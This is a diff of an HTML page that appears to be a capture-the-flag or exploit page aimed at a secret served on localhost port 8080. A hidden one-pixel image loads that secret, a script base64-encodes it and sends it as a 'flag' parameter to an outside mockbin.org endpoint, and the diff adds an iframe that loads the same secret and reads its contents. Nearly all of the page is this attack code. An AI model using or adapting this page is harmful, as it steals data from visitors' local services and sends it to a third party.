@@ -7,7 +7,7 @@
   </head>
   <body>
   
-  <!--<iframe src="http://127.0.0.1:8080/secret"></iframe> -->
+  
     <script>
 function getBase64Image(img) {
     // Create an empty canvas element
@@ -32,6 +32,20 @@ function sendrequ(){
 	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + getBase64Image(document.getElementById("ttt"));
 	document.body.appendChild(img);
 }   
+
+function getFrameContents(){
+   var iFrame =  document.getElementById('testf');
+   var iFrameBody;
+   if ( iFrame.contentDocument ) 
+   { // FF
+     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
+   }
+   else if ( iFrame.contentWindow ) 
+   { // IE
+     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
+   }
+    alert(iFrameBody.innerHTML);
+ }
     /*
     	var xmlHttp = new XMLHttpRequest();
 	if (xmlHttp) {
@@ -50,6 +64,7 @@ function sendrequ(){
 	*/
     </script>
     <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;" onload="sendrequ()">
+    <iframe id="testf" src="http://127.0.0.1:8080/secret" onload="getFrameContents()"></iframe>
   </body>
 </html> 
  
